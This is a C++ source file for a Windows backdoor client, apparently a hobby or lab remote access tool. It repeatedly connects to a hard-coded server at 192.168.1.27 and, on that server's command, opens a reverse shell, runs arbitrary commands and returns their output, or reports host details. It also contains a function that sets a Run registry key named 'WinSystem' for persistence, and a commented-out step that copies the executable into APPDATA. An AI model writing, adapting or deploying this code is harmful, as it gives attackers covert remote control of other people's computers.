#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <strings.h>
#include <winnt.h>

#include "main.h"
#include "modules.h"


#define BUFSIZE 256

#define RUN_KEY_ADMIN "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_KEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"



int main(int argc,char* argv[])
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);
/*
    // Copy executable to appdata
    char* appdata = getenv("APPDATA");
    string copyEx = "copy \""+ string(argv[0]) + "\" " + appdata;
    system(copyEx.c_str());

    // Add registry key for persistence
    std::size_t pos = strlen(argv[0]);
    string argvzero = (string)argv[0];
    std::string name = argvzero.substr(argvzero.find_last_of('\\', pos));
    string path="\""+string(appdata)+name+"\"";
    addRunEntry("WinSystem",path.c_str());
*/
    while(1)
    {
        connect_to_server("192.168.1.27");
        Sleep(30000);
    }

    WSACleanup();
    return 0;
}

int addRunEntry(char *name, const char *path)
{
    HKEY key;
    int len = strlen(path) + 1;
    //LONG r = RegOpenKeyEx(HKEY_LOCAL_MACHINE, RUN_KEY, 0, KEY_ALL_ACCESS, &key);
	LONG r = RegOpenKeyEx(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_ALL_ACCESS, &key);

    if (r != ERROR_SUCCESS) {
        // unable to open key for adding values.
        return 1;
    }

    r = RegSetValueEx(key, name, 0, REG_SZ, (BYTE *)path, len);
    if (r != ERROR_SUCCESS) {
        RegCloseKey(key);
        // unable to change registry value.
        return 1;
    }

    RegCloseKey(key);

    // success
    return 0;
}

int connect_to_server(const char* addr)
{
    int sock;
    struct sockaddr_in server;
    int len;
    char str[BUFFERSIZE];
    sock = socket(PF_INET,SOCK_STREAM,0);
    if(sock==-1)
    {
        return -1;
    }

    memset(&server, 0,sizeof(server));
    server.sin_family = PF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(addr);

    if (connect(sock,(const struct sockaddr*)&server,sizeof(server))!= 0)
    {
        return -1;
    }
    while(1)
    {
        len = recv(sock,str,sizeof(str)-1,0);
        if(len>0)
        {
            str[len-1]='\0';
        }else{
            return -1;
        }
        if(strcmp(str,"start shell")==0)
        {
            shell_to_server(sock);
        }else if(strcmp(str,"cmd")==0)
        {
                command(sock);
        }else if(strcmp(str,"info")==0)
        {
            sendInfo(sock);
        }

    }
    closesocket(sock);
    return 0;

}
void command(int fd)
{
    const char quit_str[] ="quit: result";
    char str[BUFFERSIZE];
    ssize_t len;
    FILE* fp;
    len = recv(fd,str,sizeof(str),0);
    if(len>0)
    {
        str[len-1]='\0';
    }else{
        return;
    }
    fp = _popen(str,"r");
    if(fp)
    {
        while(fgets(str,BUFFERSIZE,fp)!=NULL)
        {
            len = send(fd,str,sizeof(str)-1,0);
            if(len == -1)
            {
                return;
            }
            if( receipt_confirmation(fd ,RECV)== -1)
            {
                return;
            }

        }
        fclose(fp);
    }
    len = send(fd,quit_str,strlen(quit_str),0);
    if(len==-1)
    {
        return;
    }

}

void sendInfo(int fd)
{
    const char quit_str[] ="quit: result";
    char str[BUFFERSIZE] ="";
    ssize_t len;
    strcat(str,"Computer Name: ");
    strcat(str,getComputerName());
    if(IsWow64())
    {
        strcat(str,"\nArchitecture: 64bits");
    }else{
        strcat(str,"\nArchitecture: 32bits");
    }


    len = send(fd,str,strlen(str),0);
    if(len==-1)
    {
        return;
    }

    len = send(fd,quit_str,strlen(quit_str),0);
    if(len==-1)
    {
        return;
    }
}

void shell_to_server(int fd)
{
    const char prompt[]="$";
    const char quit_str[] ="quit: result";
    char str[BUFFERSIZE];
    ssize_t len;
    FILE *fp;
    while(1)
    {
        len = send(fd,prompt,strlen(prompt),0);
        if(len==-1)
        {
            return;
        }
        len = recv(fd,str,sizeof(str)-1,0);
        if(len>0)
        {
            str[len-1]='\0';
        }else{
            return;
        }
        if(str[0]=='c'&&str[1]=='d')
        {
            chdir(str+3);
        }else if(startsWith("exit",str))
        {
            return;
        }
        else{
            fp = _popen(str,"r");
            if(fp)
            {
                while(fgets(str,BUFFERSIZE,fp)!=NULL)
                {
                    len = send(fd,str,sizeof(str)-1,0);
                    if(len == -1)
                    {
                    }
                    if( receipt_confirmation(fd ,RECV)== -1)
                    {
                        return;
                    }

                }
                fclose(fp);
            }
        }

        len = send(fd,quit_str,strlen(quit_str),0);
        if(len==-1)
        {
            return;
        }

        if( receipt_confirmation(fd ,RECV)== -1)
        {
            return;
        }
    }
    return;
}

int receipt_confirmation(int sock,int check)
{
    ssize_t len;

    if(check == RECV)
    {
        char str[3];
        len = recv(sock,str,sizeof(str)-1,0);
        if ( len > 0){
            str[len]='\0';

            if ( strcmp(str,"OK"))
            {
                return -1;
            }
        }else{
            return -1;
        }
    }else{
        char str[] = "OK";

        len = send(sock,str,strlen(str),0);
        if ( len == -1 )
        {
            return -1;
        }
    }

    return SUCCESS;
}

bool startsWith(const char *pre, const char *str)
{
    size_t lenpre = strlen(pre),
           lenstr = strlen(str);
    return lenstr < lenpre ? false : strncmp(pre, str, lenpre) == 0;
}

